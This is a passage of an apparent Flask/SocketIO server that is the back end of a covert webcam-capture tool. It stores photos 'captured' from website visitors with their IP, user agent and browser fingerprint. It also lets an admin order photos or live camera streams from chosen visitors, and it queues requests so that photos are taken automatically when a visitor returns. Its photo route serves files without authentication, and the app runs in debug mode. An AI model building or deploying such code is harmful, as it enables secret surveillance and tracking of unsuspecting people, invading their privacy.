            return jsonify({'status': 'error', 'message': f'File too large. Maximum size is {MAX_FILE_SIZE / 1024 / 1024:.1f}MB'}), 400

        if file_size == 0:
            return jsonify({'status': 'error', 'message': 'File is empty'}), 400

        # Use the IP address from frontend if provided, otherwise get from request
        if photo_ip:
            client_ip = photo_ip
        else:
            client_ip = get_client_ip()

        # Generate unique filename using secure_filename
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
        safe_ip = client_ip.replace('.', '_').replace(':', '_')
        safe_filename = secure_filename(f'photo_{timestamp}_{safe_ip}.jpg')
        filepath = os.path.join(PHOTOS_FOLDER, safe_filename)

        # Save the photo
        try:
            photo.save(filepath)
            # Verify file was saved and get actual size
            actual_file_size = os.path.getsize(filepath)
            if actual_file_size == 0:
                os.remove(filepath)
                return jsonify({'status': 'error', 'message': 'Failed to save file'}), 500
        except IOError as e:
            logger.error(f"IO error saving photo: {e}", exc_info=True)
            return jsonify({'status': 'error', 'message': 'Failed to save file'}), 500
        except OSError as e:
            logger.error(f"OS error saving photo: {e}", exc_info=True)
            return jsonify({'status': 'error', 'message': 'Failed to save file'}), 500

        # Get client info
        user_agent = request.headers.get('User-Agent', '')

        # Try to find matching data entry by fingerprint (only if not explicitly provided)
        if not data_entry_id and fingerprint:
            try:
                with closing(sqlite3.connect(DB_PATH)) as conn:
                    c = conn.cursor()
                    c.execute('SELECT id FROM collected_data WHERE fingerprint = ? ORDER BY timestamp DESC LIMIT 1', (fingerprint,))
                    result = c.fetchone()
                    if result:
                        data_entry_id = result[0]
            except sqlite3.Error as e:
                logger.warning(f"Database error finding data entry for fingerprint: {e}")

        # Store metadata in database
        try:
            with closing(sqlite3.connect(DB_PATH)) as conn:
                c = conn.cursor()
                c.execute('''INSERT INTO captured_photos
                             (timestamp, filename, filepath, ip_address, user_agent, file_size, fingerprint, data_entry_id, capture_source)
                             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                          (timestamp_str, safe_filename, filepath, client_ip, user_agent, actual_file_size, fingerprint, data_entry_id, capture_source))
                photo_id = c.lastrowid
                conn.commit()
        except sqlite3.Error as e:
            logger.error(f"Database error saving photo metadata: {e}", exc_info=True)
            # Try to clean up the file if database insert failed
            try:
                if os.path.exists(filepath):
                    os.remove(filepath)
            except:
                pass
            return jsonify({'status': 'error', 'message': 'Database error'}), 500

        # Enhanced logging
        logger.info(f"Photo captured - ID: {photo_id}, Source: {capture_source}, Size: {actual_file_size} bytes")
        logger.debug(f"Photo details - Filename: {safe_filename}, IP: {client_ip}, Fingerprint: {fingerprint[:16] if fingerprint else 'N/A'}...")

        return jsonify({
            'status': 'success',
            'message': 'Photo saved successfully',
            'photo_id': photo_id,
            'filename': safe_filename,
            'file_size': actual_file_size,
            'data_entry_id': data_entry_id
        }), 200

    except ValueError as e:
        logger.warning(f"Validation error in save_photo: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 400
    except IOError as e:
        logger.error(f"IO error in save_photo: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'File operation error'}), 500
    except OSError as e:
        logger.error(f"OS error in save_photo: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'File system error'}), 500
    except Exception as e:
        logger.error(f"Unexpected error in save_photo: {e}", exc_info=True)
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

@app.route('/admin/photos')
def admin_photos():
    """Admin page to view all captured photos"""
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))

    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()
            c.execute('SELECT * FROM captured_photos ORDER BY timestamp DESC')
            rows = c.fetchall()
    except sqlite3.Error as e:
        logger.error(f"Database error in admin_photos: {e}", exc_info=True)
        return render_template('photos.html', photos=[], count=0, error='Database error')

    photos = []
    for row in rows:
        photos.append({
            'id': row[0],
            'timestamp': row[1],
            'filename': row[2],
            'filepath': row[3],
            'ip_address': row[4],
            'user_agent': row[5],
            'file_size': row[6],
            'fingerprint': row[7] if len(row) > 7 else None,
            'data_entry_id': row[8] if len(row) > 8 else None,
            'capture_source': row[9] if len(row) > 9 else 'unknown'
        })

    return render_template('photos.html', photos=photos, count=len(photos))

@app.route('/captured_photos/<filename>')
def serve_photo(filename):
    """Serve captured photo files"""
    from flask import send_from_directory
    return send_from_directory(PHOTOS_FOLDER, filename)

# WebSocket handlers for photo requests
# Store active users: {entry_id: {socket_id: sid, fingerprint: fp}}
active_users = {}
# Store pending photo requests: {entry_id: [request_data, ...]}
pending_photo_requests = {}
# Store active stream sessions: {entry_id: {'admin_socket_id': socket_id, 'user_socket_id': socket_id}}
active_streams = {}
# Maximum concurrent streams to prevent server overload
MAX_CONCURRENT_STREAMS = 5

@socketio.on('connect')
def handle_connect():
    """Handle WebSocket connection"""
    logger.debug(f"WebSocket client connected: {request.sid}")

@socketio.on('ping')
def handle_ping(data):
    """Handle periodic ping from client to keep connection alive"""
    entry_id = data.get('entry_id')
    fingerprint = data.get('fingerprint', '')
    capable = data.get('capable', False)  # Can user actually stream/take photos?
    
    if entry_id:
        # If user not in active_users, register them (handles reconnection)
        if entry_id not in active_users:
            was_online = False
            active_users[entry_id] = {
                'socket_id': request.sid,
                'fingerprint': fingerprint,
                'registered_at': datetime.now().isoformat(),
                'last_ping': datetime.now().isoformat(),
                'capable': capable
            }
            join_room(f'user_{entry_id}')
            logger.debug(f"Auto-registered user entry {entry_id} via ping (capable: {capable})")
            
            # Only mark as online if user is capable
            is_online = capable
            if is_online != was_online:
                emit('user_status_update', {
                    'entry_id': entry_id,
                    'is_online': is_online
                }, broadcast=True, include_self=False)
        else:
            # Update existing user
            was_online = active_users[entry_id].get('capable', False)
            active_users[entry_id]['last_ping'] = datetime.now().isoformat()
            active_users[entry_id]['socket_id'] = request.sid
            active_users[entry_id]['capable'] = capable  # Update capability
            
            # Only mark as online if user is capable
            is_online = capable
            if is_online != was_online:
                emit('user_status_update', {
                    'entry_id': entry_id,
                    'is_online': is_online
                }, broadcast=True, include_self=False)
            
            logger.debug(f"Ping received from entry {entry_id} (capable: {capable})")

@socketio.on('disconnect')
def handle_disconnect():
    """Handle WebSocket disconnection"""
    logger.debug(f"WebSocket client disconnected: {request.sid}")
    
    # Don't immediately remove users - wait for grace period
    # The ping handler will update socket_id if they reconnect
    # The cleanup thread will remove truly offline users after 3 minutes
    
    # Find which user this socket belongs to
    for entry_id, user_info in list(active_users.items()):
        if user_info.get('socket_id') == request.sid:
            logger.debug(f"User entry {entry_id} disconnected, keeping in active_users for grace period")
            # Don't delete - let cleanup thread handle it after grace period
            break
    
    # Clean up streams where admin disconnected
    for entry_id, stream_info in list(active_streams.items()):
        if stream_info.get('admin_socket_id') == request.sid:
            # Notify user to stop streaming
            emit('stop_stream_request', {'entry_id': entry_id}, room=f'user_{entry_id}')
            del active_streams[entry_id]
            logger.debug(f"Cleaned up stream for entry {entry_id} (admin disconnected)")

@socketio.on('register_user')
def handle_register_user(data):
    """Register a user when they connect (for photo requests)"""
    entry_id = data.get('entry_id')
    fingerprint = data.get('fingerprint', '')
    capable = data.get('capable', False)  # Can user actually stream/take photos?
    
    if entry_id:
        # Update or create user registration
        # This handles re-registration after reconnection
        was_online = entry_id in active_users and active_users[entry_id].get('capable', False)
        
        active_users[entry_id] = {
            'socket_id': request.sid,
            'fingerprint': fingerprint,
            'registered_at': datetime.now().isoformat(),
            'last_ping': datetime.now().isoformat(),
            'capable': capable  # Store capability status
        }
        join_room(f'user_{entry_id}')
        logger.debug(f"Registered user entry {entry_id} with fingerprint {fingerprint[:16]}... (capable: {capable})")
        
        # Only mark as online if user is capable of streaming/taking photos
        is_online = capable
        if is_online != was_online:
            emit('user_status_update', {
                'entry_id': entry_id,
                'is_online': is_online
            }, broadcast=True, include_self=False)
        
        # Check if there are any pending photo requests for this user
        if entry_id in pending_photo_requests:
            # Send all pending requests
            for request_data in pending_photo_requests[entry_id]:
                emit('photo_request', {
                    'entry_id': entry_id,
                    'fingerprint': fingerprint,
                    'requested_at': request_data.get('requested_at', datetime.now().isoformat())
                }, room=f'user_{entry_id}')
                logger.debug(f"Sent pending photo request to entry {entry_id}")
            # Clear pending requests
            del pending_photo_requests[entry_id]
        
        emit('user_registered', {'entry_id': entry_id, 'status': 'success'})
    else:
        emit('registration_error', {'error': 'Entry ID required'})

@socketio.on('request_photo')
def handle_request_photo(data):
    """Admin requests a photo from a specific user"""
    entry_id = data.get('entry_id')
    fingerprint = data.get('fingerprint', '')
    
    if not entry_id and not fingerprint:
        emit('photo_request_error', {'error': 'Entry ID or fingerprint required'})
        return
    
    # Find user by entry_id or fingerprint
    target_socket_id = None
    target_entry_id = None
    
    if entry_id and entry_id in active_users:
        target_socket_id = active_users[entry_id]['socket_id']
        target_entry_id = entry_id
    elif fingerprint:
        # Search by fingerprint
        for eid, user_info in active_users.items():
            if user_info.get('fingerprint') == fingerprint:
                target_socket_id = user_info['socket_id']
                target_entry_id = eid
                break
    
    if target_socket_id and target_entry_id:
        # Check if user is capable (can actually stream/take photos)
        user_capable = active_users[target_entry_id].get('capable', False)
        
        if not user_capable:
            error_msg = f"User cannot take photos (entry_id: {entry_id}, fingerprint: {fingerprint[:16] if fingerprint else 'N/A'}...)"
            logger.warning(error_msg)
            emit('photo_request_error', {
                'error': error_msg,
                'suggestion': 'The user must have camera access enabled to take photos. User is connected but cannot access camera.'
            })
            return
        
        # User is online and capable - send photo request
        request_data = {
            'entry_id': target_entry_id,
            'fingerprint': fingerprint,
            'requested_at': datetime.now().isoformat()
        }
        emit('photo_request', request_data, room=f'user_{target_entry_id}')
        logger.debug(f"Photo request sent to entry {target_entry_id}")
        emit('photo_requested', {
            'entry_id': target_entry_id,
            'status': 'sent',
            'message': 'Photo request sent to user'
        })
    else:
        # User not online - store request as pending
        # Try to find entry_id by fingerprint if not provided
        if not entry_id and fingerprint:
            # Search database for entry with this fingerprint
            try:
                with closing(sqlite3.connect(DB_PATH)) as conn:
                    c = conn.cursor()
                    c.execute('SELECT id FROM collected_data WHERE fingerprint = ? ORDER BY timestamp DESC LIMIT 1', (fingerprint,))
                    result = c.fetchone()
                    if result:
                        entry_id = result[0]
            except sqlite3.Error as e:
                logger.warning(f"Error looking up fingerprint: {e}")
        
        if entry_id:
            # Store as pending request
            if entry_id not in pending_photo_requests:
                pending_photo_requests[entry_id] = []
            pending_photo_requests[entry_id].append({
                'entry_id': entry_id,
                'fingerprint': fingerprint,
                'requested_at': datetime.now().isoformat()
            })
            logger.debug(f"User not online, stored pending photo request for entry {entry_id}")
            emit('photo_requested', {
                'entry_id': entry_id,
                'status': 'pending',
                'message': 'Photo request stored. Will be sent when user comes online.'
            })
        else:
            error_msg = f"User not found (entry_id: {entry_id}, fingerprint: {fingerprint[:16] if fingerprint else 'N/A'}...)"
            logger.warning(error_msg)
            emit('photo_request_error', {
                'error': error_msg,
                'suggestion': 'The user may not be currently on the website. Photo will be captured automatically when they visit.'
            })

@socketio.on('request_stream')
def handle_request_stream(data):
    """Admin requests a live stream from a specific user"""
    entry_id = data.get('entry_id')
    fingerprint = data.get('fingerprint', '')
    
    if not entry_id and not fingerprint:
        emit('stream_request_error', {'error': 'Entry ID or fingerprint required'})
        return
    
    # Check concurrent stream limit to prevent server overload
    if len(active_streams) >= MAX_CONCURRENT_STREAMS:
        emit('stream_request_error', {
            'error': 'Maximum concurrent streams reached',
            'suggestion': f'Only {MAX_CONCURRENT_STREAMS} streams can run simultaneously. Please wait for another stream to finish.'
        })
        logger.warning(f"Stream request rejected: maximum concurrent streams ({MAX_CONCURRENT_STREAMS}) reached")
        return
    
    # Find user by entry_id or fingerprint
    target_socket_id = None
    target_entry_id = None
    
    if entry_id and entry_id in active_users:
        target_socket_id = active_users[entry_id]['socket_id']
        target_entry_id = entry_id
    elif fingerprint:
        # Search by fingerprint
        for eid, user_info in active_users.items():
            if user_info.get('fingerprint') == fingerprint:
                target_socket_id = user_info['socket_id']
                target_entry_id = eid
                break
    
    if target_socket_id and target_entry_id:
        # Check if user is capable (can actually stream/take photos)
        user_capable = active_users[target_entry_id].get('capable', False)
        
        if not user_capable:
            error_msg = f"User cannot stream (entry_id: {entry_id}, fingerprint: {fingerprint[:16] if fingerprint else 'N/A'}...)"
            logger.warning(error_msg)
            emit('stream_request_error', {
                'error': error_msg,
                'suggestion': 'The user must have camera access enabled to start a live stream. User is connected but cannot access camera.'
            })
            return
        
        # User is online and capable - send stream request
        request_data = {
            'entry_id': target_entry_id,
            'fingerprint': fingerprint,
            'requested_at': datetime.now().isoformat()
        }
        emit('stream_request', request_data, room=f'user_{target_entry_id}')
        
        # Store stream session
        active_streams[target_entry_id] = {
            'admin_socket_id': request.sid,
            'user_socket_id': target_socket_id,
            'started_at': datetime.now().isoformat()
        }
        
        logger.debug(f"Stream request sent to entry {target_entry_id}")
        emit('stream_requested', {
            'entry_id': target_entry_id,
            'status': 'started',
            'message': 'Stream request sent to user'
        })
    else:
        # User not online
        error_msg = f"User not online (entry_id: {entry_id}, fingerprint: {fingerprint[:16] if fingerprint else 'N/A'}...)"
        logger.warning(error_msg)
        emit('stream_request_error', {
            'error': error_msg,
            'suggestion': 'The user must be online and have camera access to start a live stream.'
        })

@socketio.on('stop_stream')
def handle_stop_stream(data):
    """Admin stops a live stream"""
    entry_id = data.get('entry_id')
    
    if entry_id and entry_id in active_streams:
        # Notify user to stop streaming
        emit('stop_stream_request', {'entry_id': entry_id}, room=f'user_{entry_id}')
        
        # Remove stream session
        del active_streams[entry_id]
        
        emit('stream_stopped', {
            'entry_id': entry_id,
            'status': 'stopped',
            'message': 'Stream stopped'
        })
        logger.debug(f"Stream stopped for entry {entry_id}")
    else:
        emit('stream_request_error', {'error': 'No active stream found'})

@socketio.on('stream_frame')
def handle_stream_frame(data):
    """Receive video frame from user and forward to admin"""
    entry_id = data.get('entry_id')
    frame_data = data.get('frame_data')  # Base64 encoded frame
    
    if entry_id and entry_id in active_streams:
        # Forward frame to admin
        admin_socket_id = active_streams[entry_id]['admin_socket_id']
        emit('stream_frame', {
            'entry_id': entry_id,
            'frame_data': frame_data,
            'timestamp': datetime.now().isoformat()
        }, to=admin_socket_id)

@socketio.on('stream_status')
def handle_stream_status(data):
    """Handle stream status updates from user"""
    entry_id = data.get('entry_id')
    status = data.get('status')
    message = data.get('message', '')
    
    if entry_id and entry_id in active_streams:
        # Forward status to admin
        admin_socket_id = active_streams[entry_id]['admin_socket_id']
        emit('stream_status', {
            'entry_id': entry_id,
            'status': status,
            'message': message,
            'timestamp': datetime.now().isoformat()
        }, to=admin_socket_id)
        logger.info(f"Stream status update for entry {entry_id}: {status} - {message}")

def cleanup_offline_users():
    """Background task to remove users who haven't pinged in a while"""
    while True:
        time.sleep(60)  # Check every minute
        current_time = datetime.now()
        offline_threshold = 180  # 3 minutes without ping = offline (grace period)
        
        for entry_id, user_info in list(active_users.items()):
            last_ping_str = user_info.get('last_ping')
            if last_ping_str:
                try:
                    last_ping = datetime.fromisoformat(last_ping_str)
                    time_diff = (current_time - last_ping).total_seconds()
                    
                    if time_diff > offline_threshold:
                        # User hasn't pinged in 3 minutes - mark as offline
                        del active_users[entry_id]
                        logger.debug(f"Removed offline user entry {entry_id} (no ping for {time_diff:.0f}s)")
                        
                        # Clean up streams
                        if entry_id in active_streams:
                            del active_streams[entry_id]
                        
                        # Broadcast offline status
                        socketio.emit('user_status_update', {
                            'entry_id': entry_id,
                            'is_online': False
                        }, broadcast=True, include_self=False, namespace='/')
                except Exception as e:
                    logger.warning(f"Error checking ping time for entry {entry_id}: {e}")

# Start cleanup thread
cleanup_thread = threading.Thread(target=cleanup_offline_users, daemon=True)
cleanup_thread.start()
logger.info("Started background cleanup thread for offline users (3 minute grace period)")

if __name__ == '__main__':
    socketio.run(app, debug=True, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)